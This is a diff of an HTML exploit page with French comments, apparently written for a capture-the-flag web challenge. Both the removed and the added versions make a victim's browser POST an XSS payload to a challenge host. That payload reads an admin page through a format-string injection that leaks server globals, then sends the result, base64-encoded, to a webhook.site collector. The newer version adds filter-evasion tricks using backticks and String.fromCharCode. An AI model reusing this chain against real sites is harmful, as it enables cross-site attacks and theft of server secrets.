@@ -1,28 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>XSS Attack</title>
-</head>
+<head><title>XSS Exploit</title></head>
 <body>
-  <h2>Stage 1: Exploit XSS</h2>
-  
-  <script>
-    // Stage 1: Créer un exploit XSS via POST à /your-name
-    // Nous exploitons la vulnérabilité |safe dans le template
-    const xssPayload = 'x\';fetch(\'/admin?prompt={run_cmd.__globals__}\').then(r=>r.text()).then(d=>location=\'https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?data=\'+btoa(d));//';
-    
-    // Envoyer au endpoint your-name via POST
-    fetch('https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/your-name', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: 'name=' + encodeURIComponent(xssPayload),
-      credentials: 'include'
-    })
-    .then(response => {
-      console.log("Stage 1 complete!");
-      // Le bot recevra cette réponse qui contient notre XSS
-      // L'XSS s'exécutera sur le même domaine que le cookie admin
-    });
-  </script>
+<h1>Exploitation en cours...</h1>
+
+<script>
+// Créer un formulaire dynamique pour exploiter la faille XSS via l'attribut onfocus
+// L'astuce est d'utiliser des backticks pour éviter les quotes et String.fromCharCode pour le deux-points
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = 'https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/your-name';
+
+const input = document.createElement('input');
+input.name = 'name';
+input.value = 'x`;fetch(`/admin?prompt={run_cmd.__globals__}`).then(r=>r.text()).then(t=>fetch(`https${String.fromCharCode(58)}//webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?d=`+btoa(t)));//';
+
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
+</script>
 </body>
 </html>
